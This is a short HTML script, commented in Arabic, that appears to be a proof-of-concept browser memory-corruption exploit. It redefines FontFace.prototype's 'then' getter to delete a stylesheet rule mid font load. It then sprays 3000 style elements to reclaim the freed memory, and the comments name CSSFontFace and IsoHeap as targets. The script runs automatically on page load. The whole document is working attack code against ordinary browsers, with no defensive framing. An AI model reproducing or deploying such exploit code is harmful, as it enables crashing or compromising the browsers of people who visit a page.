<script>
    let sprayedCSS = [];

    function trigger() {
        // إنشاء عنصر DOM وسيط لاستخدامه كـ "مُشغل" (Trigger)
        let div = document.createElement('div');
        document.body.appendChild(div);

        let font = new FontFace('TargetFont', 'local(Arial)', { unicodeRange: 'U+0041' });
        document.fonts.add(font);

        Object.defineProperty(FontFace.prototype, 'then', {
            get() {
                // 1. الحذف
                document.getElementById('fontStyle').sheet.deleteRule(0);
                
                // 2. الهجوم: إنشاء كائنات CSS مكثفة (أكثر توافقاً مع IsoHeap)
                for (let i = 0; i < 3000; i++) {
                    // ننشئ كائنات CSS حقيقية، هي أقرب في الذاكرة لـ CSSFontFace
                    let s = document.createElement('style');
                    s.textContent = '.a' + i + '{color:red}';
                    document.head.appendChild(s);
                    sprayedCSS.push(s);
                }
                return undefined;
            }
        });
        font.load();
    }

    setTimeout(trigger, 1000);
</script>
